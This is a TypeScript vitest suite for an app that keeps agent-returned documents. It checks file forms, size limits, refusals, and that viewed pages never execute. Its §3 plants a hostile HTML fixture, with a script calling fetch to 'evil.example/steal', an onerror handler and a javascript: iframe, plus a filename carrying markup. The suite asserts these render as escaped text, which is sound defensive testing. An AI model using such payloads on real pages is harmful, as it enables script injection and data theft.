import { mkdirSync, mkdtempSync, renameSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { FakeProviderSessions, FakeRuntime } from '@brobot2/runtime'
import type { Provider } from '@brobot2/shared'
import { type AppDatabase, openDatabase } from '../src/main/db/connection'
import { applyMigrations } from '../src/main/db/migrate'
import { createSessionStore, type SessionStore } from '../src/main/db/session-store'
import { NO_DISCOVERY } from '../src/main/adopt/discover-sessions'
import { agentCallerId, agentToolsFor } from '../src/main/runtime/agent-tools'
import { RuntimeHost, type RuntimeEventSink } from '../src/main/runtime/runtime-host'
import { resolveSessionCwd } from '../src/main/runtime/scratch-cwd'
import {
  MOST_BYTES_OF_ANY_FORM,
  MOST_BYTES_OF_FORM,
  resourcesRoot,
} from '../src/main/resources/resources'
import {
  CONTENT_OF_FORM,
  DOCUMENT_FORMS,
  FORM_OF_EXTENSION,
  formOfName,
  type DocumentForm,
} from '../src/shared/documents'
import { renderMarkdown } from '../src/renderer/src/lib/markdown'

/**
 * # 🔴 635 · documents hold what agents produce — `HO-097` §1
 *
 * An agent’s returned report, page, image, or PDF is registered as a document, listed on its
 * project page, and readable by agents across projects and later work.
 *
 * ⚑ **D-016 · what an agent hands back is a RESOURCE of the piece it replies on** — copied byte for
 * byte into `<userData>/resources/<sha256>/<name>`, listed on that piece's record, and readable by
 * every agent by its id. ⛔ The registry, its numbering and its projects are gone; the forms, their
 * bounds and the rule below are not.
 *
 * ## ⛔ The constraint that is not negotiable, and it is measured rather than argued
 *
 * > 🔴 **`HO-097` §1.3: *Viewing a document never executes its code inside BroBot.***
 *
 * ⚠️ **§3 plants a HOSTILE page** — one whose script would set a global and fetch a URL — and
 * measures that neither happened. ⛔ **A test that rendered a benign page would prove nothing**
 * (`a-positive-assertion-must-differ-from-the-default`, and this dispatch's own §1.2).
 *
 * ## ⚑ Everything below runs on a REAL host over a REAL SQLite ledger
 *
 * ⛔ The one door a resource is kept through is `replyToParent`'s — `627` measured it is the only
 * one and `HO-097` §1.1 says to keep it so — reached here on a piece a real `giveWork` handed out.
 */

const here = dirname(fileURLToPath(import.meta.url))
const migrationsFolder = join(here, '../src/main/db/migrations')

class Window implements RuntimeEventSink {
  readonly aPersonIsBehindIt = true
  alive = true
  constructor(readonly ownerId: string) {}
  send(): void {}
  sendLiveness(): void {}
}

describe('635 · the store widens, and viewing never executes', () => {
  let userData: string
  let work: string
  let db: AppDatabase
  let host: RuntimeHost
  let store: SessionStore
  let counter: number
  let window: Window
  let clock: number
  const tick = (): number => clock++

  beforeEach(() => {
    userData = mkdtempSync(join(tmpdir(), 'brobot2-635-'))
    work = mkdtempSync(join(tmpdir(), 'brobot2-635-work-'))
    db = openDatabase(join(userData, 'brobot2.sqlite'))
    applyMigrations(db, migrationsFolder)
    clock = 1_800_000_000_000
    store = createSessionStore(db, tick)
    counter = 0
    const sessions = new FakeProviderSessions()
    host = new RuntimeHost({
      store,
      discoverSessions: NO_DISCOVERY,
      nativeTranscriptPath: () => null,
      exportDirectory: () => join(userData, 'exports'),
      resourcesRoot: () => resourcesRoot(userData),
      createRuntime: () => new FakeRuntime('claude', { sessions }),
      prepareProviderHome: (provider: Provider, profileId?: string) => {
        const home = join(userData, 'provider-homes', profileId ?? 'default', provider)
        mkdirSync(home, { recursive: true })
        return home
      },
      providerHomePath: (provider: Provider) => join(userData, 'provider-homes', provider),
      resolveCwd: (sessionId, requested) => resolveSessionCwd(userData, sessionId, requested),
      newSessionId: () => `sess_${++counter}`,
      now: tick,
      readProviderConfig: (provider, home) => ({
        home,
        homeEnv: 'CLAUDE_CONFIG_DIR',
        model: 'm',
        authNote: null,
        files: [],
      }),
    })
    window = new Window('webContents:1')
  })

  afterEach(async () => {
    await host.closeAll()
    db.close()
    rmSync(userData, { recursive: true, force: true })
    rmSync(work, { recursive: true, force: true })
  })

  const personOpens = async (): Promise<string> => {
    const { sessionId } = await host.createSession(
      { provider: 'claude', profileId: 'default', cwd: work, approvalMode: 'auto' },
      window,
    )
    return sessionId
  }

  /** ⚑ Write a file inside the working folder and answer its absolute path. */
  const wrote = (name: string, body: string | Buffer): string => {
    const path = join(work, name)
    mkdirSync(dirname(path), { recursive: true })
    writeFileSync(path, body)
    return path
  }

  /**
   * ⚑ **A piece to reply on** — a person's conversation gives one with `giveWork`, and the
   * conversation it reaches is the one that hands files back. ⛔ A refused reply records nothing, so
   * the piece stays open for the next offer; a reply that is kept ends it.
   */
  const aPiece = async (): Promise<{ giver: string; owner: string; label: string }> => {
    const giver = await personOpens()
    const given = await host.giveWork(
      {
        definition_of_done: 'The requested result and its checks are recorded.',
        profile: 'default',
        title: 'Write the answer',
        brief: 'write the answer',
      },
      { ownerId: agentCallerId(giver) },
    )
    if (!given.ok) throw new Error(`expected a give, got ${given.refusal.rail}`)
    return { giver, owner: given.owner, label: given.label }
  }

  /** The reply that hands `paths` in, on `piece` — the one door a resource is kept through. */
  const offer = (piece: { owner: string; label: string }, paths: readonly string[]) =>
    host.replyToParent(
      {
        piece: piece.label,
        outcome: 'done',
        summary: 'done it',
        resourcePaths: paths,
        needsUserAction: false,
      },
      { ownerId: agentCallerId(piece.owner) },
    )

  /** One file, kept on a piece of its own, and the resource id the reply gave it. */
  const mustKeep = async (path: string): Promise<string> => {
    const done = await offer(await aPiece(), [path])
    if (!done.ok) throw new Error(`refused: ${done.refusal.rail}`)
    const [resource] = done.resources
    if (resource === undefined) throw new Error('the reply kept no resource')
    return resource
  }

  it('give inputs and update resources retain the common refusal when the reply has its own words', async () => {
    const piece = await aPiece()
    const path = wrote('not-kept.zsh', 'Fictional text; never executed.')
    const tools = agentToolsFor(host, piece.giver).tools
    for (const [name, args] of [
      [
        'give_work',
        {
          profile: 'default',
          title: 'Read notes',
          brief: 'Read notes',
          definition_of_done: 'Notes read',
          inputs: [path],
        },
      ],
      ['update_work', { piece: piece.label, resources: [path] }],
    ] as const) {
      const answer = await tools.find((one) => one.name === name)!.call(args)
      expect(answer.structured?.['outcome']).toBe('refused')
      expect(answer.structured?.['rail']).toBe('resource-not-a-form-this-app-keeps')
      expect(String(answer.structured?.['reason'])).toContain(
        'Keep it where it is and name its full path in what you write. Use the assigned folder.',
      )
      expect(String(answer.structured?.['reason'])).not.toContain(
        'summary instead of resource_paths',
      )
    }
    const record = host.pieceRecord(piece.giver, piece.label)
    if (record.is !== 'a-piece') throw new Error('fictional piece missing')
    expect(store.resourcesOf(record.piece.piece)).toEqual([])
  })

  // ───────────────────────────────────────────────────────────────────────────────────────────
  // §1 · every form is kept, is listed, and is readable — `HO-097` §1
  // ───────────────────────────────────────────────────────────────────────────────────────────

  describe('§1 · what the store now holds', () => {
    /**
     * 🔴 **Each member of {@link DocumentForm} ARRIVING, from a real file through the real door**
     * (this dispatch's §3.2: *show each member arriving in a test, not merely declared*).
     *
     * ⛔ **Derived from the vocabulary rather than listed**, so a form added tomorrow fails here
     * until somebody gives it a file — `a-loop-over-a-literal-variant-list-is-not-exhaustive`.
     */
    const A_FILE_OF: Readonly<Record<DocumentForm, { name: string; body: string | Buffer }>> = {
      markdown: { name: 'report.md', body: '# The answer\n' },
      page: { name: 'clock.html', body: '<!doctype html>\n<p>the world clock</p>\n' },
      // ⚑ **A real PNG header**, so the bytes are a picture rather than text with a `.png` on it.
      image: { name: 'shot.png', body: Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex') },
      pdf: { name: 'report.pdf', body: Buffer.from('%PDF-1.7\n%\xE2\xE3\xCF\xD3\n', 'binary') },
    }

    it('🔴 every form is kept, keeps its own extension, and reads its form back', async () => {
      for (const form of DOCUMENT_FORMS) {
        const fixture = A_FILE_OF[form]
        const resource = await mustKeep(wrote(fixture.name, fixture.body))
        const read = host.readResource(resource)
        expect(read.ok, `${form}: ${JSON.stringify(read)}`).toBe(true)
        if (!read.ok) continue
        // ⛔ **The FORM came back, and it was derived from the kept name** — no column.
        expect(read.form).toBe(form)
        // ⚑ **The kept copy carries the file's own name**, which is what makes that derivation
        // possible and what a person opening the folder sees.
        const kept = store.resource(resource)?.name ?? ''
        expect(formOfName(kept)).toBe(form)
        expect(kept).toBe(fixture.name)
      }
    })

    it('⚑ …and every one of them is LISTED on the piece it was handed back with', async () => {
      const piece = await aPiece()
      const paths = DOCUMENT_FORMS.map((form) => wrote(A_FILE_OF[form].name, A_FILE_OF[form].body))
      const done = await offer(piece, paths)
      if (!done.ok) throw new Error(`refused: ${done.refusal.rail}`)
      const record = host.pieceRecord(piece.giver, piece.label)
      if (record.is !== 'a-piece') throw new Error(`expected the piece's record, got ${record.is}`)
      expect(record.resources).toHaveLength(DOCUMENT_FORMS.length)
      // ⛔ **By FORM and not by count**, so a listing that held four Markdown rows would fail.
      expect(new Set(record.resources.map((one) => formOfName(one.name)))).toEqual(
        new Set(DOCUMENT_FORMS),
      )
    })

    it('⛔ an EMPTY file is refused whatever its type — the one text rule that is about the FILE', async () => {
      // ⚑ **`resource-empty`'s own sentence is true of a picture**: *an empty file is not a
      // resource*. ⚠️ The UTF-8 rule is about an ENCODING and is skipped for a binary form; this
      // one is not.
      const piece = await aPiece()
      for (const name of ['empty.md', 'empty.png', 'empty.pdf']) {
        const refused = await offer(piece, [wrote(name, Buffer.alloc(0))])
        expect(refused.ok, `${name} was kept`).toBe(false)
        if (!refused.ok) expect(refused.refusal.rail, name).toBe('resource-empty')
      }
    })

    it('⛔ a type this app has no word for is refused, and the refusal names a performable act', async () => {
      const refused = await offer(await aPiece(), [wrote('deliverable.zip', 'not a document\n')])
      expect(refused.ok).toBe(false)
      if (refused.ok) return
      expect(refused.refusal.rail).toBe('resource-not-a-form-this-app-keeps')
      // 🔴 **`permanent`, so no remedy FIELD** — `425`'s biconditional, which `628` re-ruled.
      expect(refused.refusal.permanence).toBe('permanent')
      expect(refused.refusal.retryable).toBe(false)
      expect(refused.refusal.remedy).toBeNull()
      // A reply names its summary field; other file-writing doors retain the common remedy.
      expect(refused.refusal.reason).toBe(
        'This app does not keep a .zip file. It keeps a Markdown file, a page, an image or a PDF. Name its full path in summary instead of resource_paths; keep the file where it is. Nothing was kept or recorded.',
      )
      expect(refused.refusal.reason).not.toMatch(/project folder/i)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────────────────────
  // §2 · what a MODEL is handed — `HO-097` §1.2
  // ───────────────────────────────────────────────────────────────────────────────────────────

  describe('§2 · the content union', () => {
    it('🔴 a report is markdown, a page is its SOURCE, and a picture says it is not text', async () => {
      const report = await mustKeep(wrote('r.md', '# it worked\n'))
      const page = await mustKeep(wrote('p.html', '<p>hello</p>\n'))
      const picture = await mustKeep(wrote('s.png', Buffer.from('89504e470d0a1a0a', 'hex')))

      const read = (id: string) => {
        const answer = host.readResource(id)
        if (!answer.ok) throw new Error(`refused: ${answer.refusal.rail}`)
        return answer.content
      }
      expect(read(report)).toEqual({ as: 'markdown', text: '# it worked\n' })
      // ⛔ **The source, verbatim** — not rendered, not stripped. A model reads HTML.
      expect(read(page)).toEqual({ as: 'source', text: '<p>hello</p>\n' })
      // 🔴 **A MEMBER and not a missing key** (`HO-097` §1.2, this dispatch's §3.1).
      expect(read(picture)).toEqual({ as: 'not-for-a-model', because: 'a-picture-is-not-text' })
      // ⛔ **And a PDF says its OWN reason.** ⚠️ Both are withheld and the words differ — a member
      // that reported a picture's reason over a PDF would compile, pass an exhaustive check, and
      // tell a model a fact about a different file.
      const pdf = await mustKeep(wrote('r.pdf', Buffer.from('%PDF-1.7\n', 'binary')))
      expect(read(pdf)).toEqual({ as: 'not-for-a-model', because: 'a-pdf-is-not-text' })
    })

    it('⛔ …and the `not-for-a-model` arm is reachable for EVERY form the table says it is', () => {
      // ⚑ **Derived from `CONTENT_OF_FORM`**, so a form routed there without a `because` fails —
      // `a-closed-vocabulary-guards-what-a-member-says`.
      const silent = DOCUMENT_FORMS.filter((form) => CONTENT_OF_FORM[form] === 'not-for-a-model')
      expect(
        silent.length,
        'no form is withheld — the union has an arm nothing produces',
      ).toBeGreaterThan(0)
      expect([...silent].sort()).toEqual(['image', 'pdf'])
    })
  })

  // ───────────────────────────────────────────────────────────────────────────────────────────
  // §3 · 🔴 THE CONSTRAINT · viewing never executes — `HO-097` §1.3
  // ───────────────────────────────────────────────────────────────────────────────────────────

  describe('§3 · a hostile page, planted', () => {
    /**
     * 🔴 **A page whose script WOULD set a global and fetch a URL if anything ran it** —
     * `put-the-hazard-on-the-path-the-code-walks`, and this dispatch's §1.2 by name.
     */
    const HOSTILE =
      '<!doctype html>\n' +
      '<h1>Report</h1>\n' +
      '<script>window.__brobot_owned = true; fetch("https://evil.example/steal")</script>\n' +
      '<img src=x onerror="window.__brobot_owned = true">\n' +
      '<iframe src="javascript:window.__brobot_owned = true"></iframe>\n'

    it('🔴 the page a person sees is TEXT — no tag survives the renderer', async () => {
      const resource = await mustKeep(wrote('evil.html', HOSTILE))
      const shown = host.readResourceForAPerson(resource)
      expect(shown.ok, JSON.stringify(shown)).toBe(true)
      if (!shown.ok) return
      // ⚑ **The window is told it is a PAGE**, which is what puts it in source view.
      expect(shown.form).toBe('page')
      expect(shown.text).toBe(HOSTILE)

      // 🔴 **THE MEASUREMENT.** ⛔ `DocumentBody` renders through `renderMarkdown`, whose module
      // note calls `html: false` *"the whole security story"* — so this is that story, asserted
      // over the hostile bytes rather than over a benign page.
      const drawn = renderMarkdown(shown.text ?? '')
      // ⛔ **Asserted on TAGS and not on substrings, and that is a correction to this test's own
      // first draft.** ⚠️ It asked that `onerror=` and `javascript:` be absent from the output —
      // and they are PRESENT, as escaped text, which is exactly right: a source view owes the
      // reader the page's own words. 🔴 What must not exist is a live element, so that is what is
      // measured.
      expect(drawn).not.toMatch(/<(script|iframe|img|object|embed|svg)\b/i)
      // ⚠️ **The paired positive, and without it the negative is satisfiable by a renderer that
      // returns nothing** (`a-positive-assertion-must-differ-from-the-default`): the page's markup
      // IS there, escaped, so the absence above is the escaping and not an empty string.
      expect(drawn).toContain('__brobot_owned')
      expect(drawn).toContain('&lt;script&gt;')
      expect(drawn).toContain('onerror=')
    })

    it('⛔ …and the control: a page of PLAIN markup renders as text too, so this is not one file', async () => {
      const resource = await mustKeep(wrote('plain.html', '<b>bold</b>\n'))
      const shown = host.readResourceForAPerson(resource)
      if (!shown.ok) throw new Error('the fixture was not kept')
      expect(renderMarkdown(shown.text ?? '')).toContain('&lt;b&gt;')
    })

    // Windows forbids angle brackets in a filename, so this markup-name fixture is POSIX-only.
    it.skipIf(process.platform === 'win32')(
      '⚠️ the NAME is untrusted too: it comes back as the file’s own name, as data, never a path',
      async () => {
        // 🔴 **§1.3: *the document is not the only untrusted thing*.** ⛔ A filename is a place
        // markup has been smuggled before. ⚑ **D-016 · the kept name is the FILE's own** — the
        // registry's composed, numbered name went with it — so markup an agent put in a name reaches
        // the window verbatim. ⚠️ **What keeps it text there is only Vue's text interpolation** —
        // `{{ result.name }}` in `CanonicalDocumentViewer.vue`, and `{{ filename }}` in the
        // `DocumentBody` label it hands the name to. No DOM case draws a markup name: the DOM lane's
        // names are app-composed ones, so this case pins the name as DATA and nothing more.
        const tagged = '<img src=x onerror=1>.md'
        const resource = await mustKeep(wrote(tagged, '# hi\n'))
        const shown = host.readResourceForAPerson(resource)
        if (!shown.ok) throw new Error('the fixture was not kept')
        expect(shown.name).toBe(tagged)
        // ⛔ **One segment and never a path** (`380`): nothing about where it is kept crosses.
        expect(shown.name).not.toContain('/')
        expect(JSON.stringify(shown)).not.toContain(userData)
      },
    )
  })

  // ───────────────────────────────────────────────────────────────────────────────────────────
  // §4 · the size bound — `HO-097` §1.4
  // ───────────────────────────────────────────────────────────────────────────────────────────

  describe('§4 · how big a resource may be', () => {
    it('⚑ a picture larger than a REPORT may be is taken, and the bound is the form’s', async () => {
      // ⛔ **Measured where the two readings DIVERGE** (standing rule 3): a file over the text
      // bound and under the binary one. A single bound cannot tell these two answers apart.
      const big = Buffer.alloc(MOST_BYTES_OF_FORM.markdown + 1024)
      Buffer.from('89504e470d0a1a0a', 'hex').copy(big)
      expect(big.length).toBeGreaterThan(MOST_BYTES_OF_FORM.markdown)
      expect(big.length).toBeLessThan(MOST_BYTES_OF_FORM.image)
      const resource = await mustKeep(wrote('big.png', big))
      // 🔴 **READ IT BACK.** ⛔ Keeping is half the promise; a reader whose ceiling did not follow
      // the writer would copy this file, hash it, list it — and then refuse to open the app's own
      // resource. ⚑ That is `MOST_BYTES_OF_ANY_FORM` being derived rather than written.
      const back = host.readResource(resource)
      expect(back.ok, JSON.stringify(back)).toBe(true)
      if (back.ok) expect(back.form).toBe('image')

      // ⚠️ **The same size as MARKDOWN is refused**, which is what makes the green above the
      // FORM's bound rather than one number having moved.
      const refused = await offer(await aPiece(), [wrote('big.md', 'x'.repeat(big.length))])
      expect(refused.ok).toBe(false)
      if (refused.ok) return
      expect(refused.refusal.rail).toBe('resource-too-large')
      // ⛔ **`while-this-holds`, so it DOES carry a remedy** — `628`'s rule, from the other side.
      expect(refused.refusal.permanence).toBe('while-this-holds')
      expect(refused.refusal.remedy).not.toBeNull()
      // ⚑ **And the detail names the number this file was measured against.**
      expect(refused.refusal.detail).toMatchObject({ limit: MOST_BYTES_OF_FORM.markdown })

      // The detail names the file as the agent spelled it, so among several it can tell which.
      wrote('notes/too-big.md', 'x'.repeat(big.length))
      const named = await offer(await aPiece(), [wrote('fits.md', 'fits'), 'notes/too-big.md'])
      expect(named.ok).toBe(false)
      if (named.ok) return
      expect(named.refusal.rail).toBe('resource-too-large')
      expect(named.refusal.detail).toMatchObject({ path: 'notes/too-big.md' })
    })

    it('⛔ the reader’s ceiling is DERIVED from the widest form, never written twice', () => {
      expect(MOST_BYTES_OF_ANY_FORM).toBe(Math.max(...Object.values(MOST_BYTES_OF_FORM)))
      // ⚠️ **Non-vacuity**: the forms really do differ, so the max is a choice and not a constant.
      expect(new Set(Object.values(MOST_BYTES_OF_FORM)).size).toBeGreaterThan(1)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────────────────────
  // §5 · the allow-list
  // ───────────────────────────────────────────────────────────────────────────────────────────

  describe('§5 · a name this build cannot read', () => {
    it('🔴 a kept row whose extension this build has no word for REFUSES, never guesses', async () => {
      // ⛔ **A row written by a LATER build**, which is the one way this state is reachable: the
      // writer keeps only a name the allow-list admits, so nothing in THIS build can make one.
      // ⚑ The row is moved by hand and the bytes go with it, so the hash still matches — what is
      // left is exactly the question *can this app say what these bytes are*.
      const resource = await mustKeep(wrote('r.md', '# the answer\n'))
      const before = store.resource(resource)
      if (before === null) throw new Error('the fixture was not kept')
      // ⚠️ **The control FIRST**: it reads perfectly well as a report.
      expect(host.readResource(resource).ok).toBe(true)

      const folder = join(resourcesRoot(userData), before.sha256)
      const moved = before.name.replace(/\.md$/, '.xyz')
      renameSync(join(folder, before.name), join(folder, moved))
      db.prepare('UPDATE work_resource SET name = ? WHERE id = ?').run(moved, resource)

      const read = host.readResource(resource)
      expect(read.ok).toBe(false)
      // ⛔ **`resource-bytes-unreadable` and not a guess** — the bytes are there and this app
      // cannot say what they are, which is what that rail means.
      if (!read.ok) expect(read.refusal.rail).toBe('resource-bytes-unreadable')
    })
  })

  describe('§6 · one table decides three things', () => {
    it('⛔ every extension in the table maps to a form, and the lookup is case-blind', () => {
      for (const [extension, form] of Object.entries(FORM_OF_EXTENSION)) {
        expect(formOfName(`x${extension}`)).toBe(form)
        expect(formOfName(`x${extension.toUpperCase()}`)).toBe(form)
      }
    })

    it('⚑ …and a name with no extension, or one nobody listed, is `null` and never a member', () => {
      expect(formOfName('README')).toBeNull()
      expect(formOfName('deliverable.zip')).toBeNull()
      expect(formOfName('.md')).toBe('markdown')
    })
  })
})
